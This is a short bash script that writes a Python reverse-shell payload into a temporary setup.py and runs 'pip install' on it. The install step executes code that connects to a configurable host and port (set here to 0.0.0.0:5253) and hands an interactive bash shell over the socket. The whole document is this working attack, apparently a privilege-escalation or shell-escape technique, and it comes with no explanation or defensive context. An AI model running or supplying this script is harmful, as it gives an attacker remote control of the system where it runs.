#!/bin/bash

export SHELL="/bin/bash"
export RHOST=0.0.0.0
export RPORT=5253
TF=$(mktemp -d)
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$RHOST'",'$RPORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["'$SHELL'","-i"]);' > $TF/setup.py; pip install $TF
